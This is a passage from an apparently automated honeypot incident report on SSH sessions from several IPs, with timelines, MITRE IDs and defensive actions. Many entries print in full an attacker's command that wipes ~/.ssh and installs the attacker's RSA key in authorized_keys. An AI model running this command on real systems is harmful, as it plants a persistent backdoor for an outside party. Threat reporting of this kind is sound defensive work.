| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:32:29` | `cowrie.session.connect` |
| `2026-05-02 15:32:29` | `cowrie.client.version` |
| `2026-05-02 15:32:29` | `cowrie.client.kex` |
| `2026-05-02 15:32:30` | `cowrie.login.success` |
| `2026-05-02 15:32:31` | `cowrie.session.params` |
| `2026-05-02 15:32:31` | `cowrie.command.input` |
| `2026-05-02 15:32:31` | `cowrie.command.failed` |
| `2026-05-02 15:32:31` | `cowrie.log.closed` |
| `2026-05-02 15:32:32` | `cowrie.session.params` |
| `2026-05-02 15:32:32` | `cowrie.command.input` |
| `2026-05-02 15:32:32` | `cowrie.session.file_download` |
| `2026-05-02 15:32:32` | `cowrie.log.closed` |
| `2026-05-02 15:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6981a199d336

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-02 15:32 |
| **Last Seen** | 2026-05-02 15:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:32:36` | `cowrie.session.connect` |
| `2026-05-02 15:32:36` | `cowrie.client.version` |
| `2026-05-02 15:32:36` | `cowrie.client.kex` |
| `2026-05-02 15:32:37` | `cowrie.login.success` |
| `2026-05-02 15:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f08db32f9e61

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-02 15:37 |
| **Last Seen** | 2026-05-02 15:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:37:14` | `cowrie.session.connect` |
| `2026-05-02 15:37:14` | `cowrie.client.version` |
| `2026-05-02 15:37:14` | `cowrie.client.kex` |
| `2026-05-02 15:37:15` | `cowrie.login.success` |
| `2026-05-02 15:37:16` | `cowrie.session.params` |
| `2026-05-02 15:37:16` | `cowrie.command.input` |
| `2026-05-02 15:37:16` | `cowrie.command.failed` |
| `2026-05-02 15:37:16` | `cowrie.log.closed` |
| `2026-05-02 15:37:17` | `cowrie.session.params` |
| `2026-05-02 15:37:17` | `cowrie.command.input` |
| `2026-05-02 15:37:17` | `cowrie.session.file_download` |
| `2026-05-02 15:37:17` | `cowrie.log.closed` |
| `2026-05-02 15:37:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3813cf466aa

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-02 15:37 |
| **Last Seen** | 2026-05-02 15:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:37:21` | `cowrie.session.connect` |
| `2026-05-02 15:37:21` | `cowrie.client.version` |
| `2026-05-02 15:37:21` | `cowrie.client.kex` |
| `2026-05-02 15:37:22` | `cowrie.login.success` |
| `2026-05-02 15:37:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-508db658b66e

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-02 15:38 |
| **Last Seen** | 2026-05-02 15:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:38:14` | `cowrie.session.connect` |
| `2026-05-02 15:38:14` | `cowrie.client.version` |
| `2026-05-02 15:38:15` | `cowrie.client.kex` |
| `2026-05-02 15:38:16` | `cowrie.login.success` |
| `2026-05-02 15:38:17` | `cowrie.session.params` |
| `2026-05-02 15:38:17` | `cowrie.command.input` |
| `2026-05-02 15:38:17` | `cowrie.command.failed` |
| `2026-05-02 15:38:17` | `cowrie.log.closed` |
| `2026-05-02 15:38:17` | `cowrie.session.params` |
| `2026-05-02 15:38:17` | `cowrie.command.input` |
| `2026-05-02 15:38:18` | `cowrie.session.file_download` |
| `2026-05-02 15:38:18` | `cowrie.log.closed` |
| `2026-05-02 15:38:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c9df4d2c618

| Field | Detail |
|---|---|
| **Source IP** | `152.200.205[.]179` |
| **First Seen** | 2026-05-02 15:38 |
| **Last Seen** | 2026-05-02 15:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:38:21` | `cowrie.session.connect` |
| `2026-05-02 15:38:21` | `cowrie.client.version` |
| `2026-05-02 15:38:21` | `cowrie.client.kex` |
| `2026-05-02 15:38:23` | `cowrie.login.success` |
| `2026-05-02 15:38:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.205[.]179` to AbuseIPDB if not already reported
- [ ] Block `152.200.205[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92f413b5b95a

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-05-02 15:47 |
| **Last Seen** | 2026-05-02 15:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:47:03` | `cowrie.session.connect` |
| `2026-05-02 15:47:03` | `cowrie.client.version` |
| `2026-05-02 15:47:03` | `cowrie.client.kex` |
| `2026-05-02 15:47:03` | `cowrie.login.success` |
| `2026-05-02 15:47:04` | `cowrie.session.params` |
| `2026-05-02 15:47:04` | `cowrie.command.input` |
| `2026-05-02 15:47:04` | `cowrie.command.failed` |
| `2026-05-02 15:47:04` | `cowrie.log.closed` |
| `2026-05-02 15:47:04` | `cowrie.session.params` |
| `2026-05-02 15:47:04` | `cowrie.command.input` |
| `2026-05-02 15:47:04` | `cowrie.session.file_download` |
| `2026-05-02 15:47:04` | `cowrie.log.closed` |
| `2026-05-02 15:47:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f033f39a168

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-05-02 15:47 |
| **Last Seen** | 2026-05-02 15:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:47:06` | `cowrie.session.connect` |
| `2026-05-02 15:47:06` | `cowrie.client.version` |
| `2026-05-02 15:47:06` | `cowrie.client.kex` |
| `2026-05-02 15:47:07` | `cowrie.login.success` |
| `2026-05-02 15:47:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ef758f91c36

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-05-02 15:49 |
| **Last Seen** | 2026-05-02 15:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:49:18` | `cowrie.session.connect` |
| `2026-05-02 15:49:18` | `cowrie.client.version` |
| `2026-05-02 15:49:18` | `cowrie.client.kex` |
| `2026-05-02 15:49:18` | `cowrie.login.success` |
| `2026-05-02 15:49:19` | `cowrie.session.params` |
| `2026-05-02 15:49:19` | `cowrie.command.input` |
| `2026-05-02 15:49:19` | `cowrie.command.failed` |
| `2026-05-02 15:49:19` | `cowrie.log.closed` |
| `2026-05-02 15:49:19` | `cowrie.session.params` |
| `2026-05-02 15:49:19` | `cowrie.command.input` |
| `2026-05-02 15:49:19` | `cowrie.session.file_download` |
| `2026-05-02 15:49:19` | `cowrie.log.closed` |
| `2026-05-02 15:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37e30122ed3f

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-05-02 15:49 |
| **Last Seen** | 2026-05-02 15:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 15:49:21` | `cowrie.session.connect` |
| `2026-05-02 15:49:21` | `cowrie.client.version` |
| `2026-05-02 15:49:21` | `cowrie.client.kex` |
| `2026-05-02 15:49:22` | `cowrie.login.success` |
| `2026-05-02 15:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61aab7205cf3

| Field | Detail |
|---|---|
| **Source IP** | `43.163.107[.]154` |
| **First Seen** | 2026-05-02 16:08 |
| **Last Seen** | 2026-05-02 16:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:08:10` | `cowrie.session.connect` |
| `2026-05-02 16:08:10` | `cowrie.client.version` |
| `2026-05-02 16:08:10` | `cowrie.client.kex` |
| `2026-05-02 16:08:10` | `cowrie.login.success` |
| `2026-05-02 16:08:11` | `cowrie.session.params` |
| `2026-05-02 16:08:11` | `cowrie.command.input` |
| `2026-05-02 16:08:11` | `cowrie.command.failed` |
| `2026-05-02 16:08:11` | `cowrie.log.closed` |
| `2026-05-02 16:08:11` | `cowrie.session.params` |
| `2026-05-02 16:08:11` | `cowrie.command.input` |
| `2026-05-02 16:08:11` | `cowrie.session.file_download` |
| `2026-05-02 16:08:11` | `cowrie.log.closed` |
| `2026-05-02 16:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.107[.]154` to AbuseIPDB if not already reported
- [ ] Block `43.163.107[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-707439c10057

| Field | Detail |
|---|---|
| **Source IP** | `43.163.107[.]154` |
| **First Seen** | 2026-05-02 16:08 |
| **Last Seen** | 2026-05-02 16:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:08:13` | `cowrie.session.connect` |
| `2026-05-02 16:08:13` | `cowrie.client.version` |
| `2026-05-02 16:08:13` | `cowrie.client.kex` |
| `2026-05-02 16:08:13` | `cowrie.login.success` |
| `2026-05-02 16:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.107[.]154` to AbuseIPDB if not already reported
- [ ] Block `43.163.107[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc240f8611bc

| Field | Detail |
|---|---|
| **Source IP** | `43.163.107[.]154` |
| **First Seen** | 2026-05-02 16:11 |
| **Last Seen** | 2026-05-02 16:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:11:15` | `cowrie.session.connect` |
| `2026-05-02 16:11:15` | `cowrie.client.version` |
| `2026-05-02 16:11:15` | `cowrie.client.kex` |
| `2026-05-02 16:11:15` | `cowrie.login.success` |
| `2026-05-02 16:11:16` | `cowrie.session.params` |
| `2026-05-02 16:11:16` | `cowrie.command.input` |
| `2026-05-02 16:11:16` | `cowrie.command.failed` |
| `2026-05-02 16:11:16` | `cowrie.log.closed` |
| `2026-05-02 16:11:16` | `cowrie.session.params` |
| `2026-05-02 16:11:16` | `cowrie.command.input` |
| `2026-05-02 16:11:16` | `cowrie.session.file_download` |
| `2026-05-02 16:11:16` | `cowrie.log.closed` |
| `2026-05-02 16:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.107[.]154` to AbuseIPDB if not already reported
- [ ] Block `43.163.107[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a7dbe648296

| Field | Detail |
|---|---|
| **Source IP** | `43.163.107[.]154` |
| **First Seen** | 2026-05-02 16:11 |
| **Last Seen** | 2026-05-02 16:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:11:18` | `cowrie.session.connect` |
| `2026-05-02 16:11:18` | `cowrie.client.version` |
| `2026-05-02 16:11:18` | `cowrie.client.kex` |
| `2026-05-02 16:11:18` | `cowrie.login.success` |
| `2026-05-02 16:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.107[.]154` to AbuseIPDB if not already reported
- [ ] Block `43.163.107[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b120f7b97050

| Field | Detail |
|---|---|
| **Source IP** | `43.163.107[.]154` |
| **First Seen** | 2026-05-02 16:16 |
| **Last Seen** | 2026-05-02 16:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:16:02` | `cowrie.session.connect` |
| `2026-05-02 16:16:02` | `cowrie.client.version` |
| `2026-05-02 16:16:02` | `cowrie.client.kex` |
| `2026-05-02 16:16:02` | `cowrie.login.success` |
| `2026-05-02 16:16:03` | `cowrie.session.params` |
| `2026-05-02 16:16:03` | `cowrie.command.input` |
| `2026-05-02 16:16:03` | `cowrie.command.failed` |
| `2026-05-02 16:16:03` | `cowrie.log.closed` |
| `2026-05-02 16:16:03` | `cowrie.session.params` |
| `2026-05-02 16:16:03` | `cowrie.command.input` |
| `2026-05-02 16:16:03` | `cowrie.session.file_download` |
| `2026-05-02 16:16:03` | `cowrie.log.closed` |
| `2026-05-02 16:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.107[.]154` to AbuseIPDB if not already reported
- [ ] Block `43.163.107[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08843b4a9514

| Field | Detail |
|---|---|
| **Source IP** | `43.163.107[.]154` |
| **First Seen** | 2026-05-02 16:16 |
| **Last Seen** | 2026-05-02 16:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:16:04` | `cowrie.session.connect` |
| `2026-05-02 16:16:04` | `cowrie.client.version` |
| `2026-05-02 16:16:04` | `cowrie.client.kex` |
| `2026-05-02 16:16:05` | `cowrie.login.success` |
| `2026-05-02 16:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.107[.]154` to AbuseIPDB if not already reported
- [ ] Block `43.163.107[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aea63f5ee5f

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-05-02 16:17 |
| **Last Seen** | 2026-05-02 16:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:17:47` | `cowrie.session.connect` |
| `2026-05-02 16:17:47` | `cowrie.client.version` |
| `2026-05-02 16:17:47` | `cowrie.client.kex` |
| `2026-05-02 16:17:47` | `cowrie.login.success` |
| `2026-05-02 16:17:47` | `cowrie.session.params` |
| `2026-05-02 16:17:47` | `cowrie.command.input` |
| `2026-05-02 16:17:47` | `cowrie.command.failed` |
| `2026-05-02 16:17:47` | `cowrie.log.closed` |
| `2026-05-02 16:17:47` | `cowrie.session.params` |
| `2026-05-02 16:17:47` | `cowrie.command.input` |
| `2026-05-02 16:17:47` | `cowrie.session.file_download` |
| `2026-05-02 16:17:47` | `cowrie.log.closed` |
| `2026-05-02 16:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c40e32fd828b

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-05-02 16:17 |
| **Last Seen** | 2026-05-02 16:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 16:17:49` | `cowrie.session.connect` |
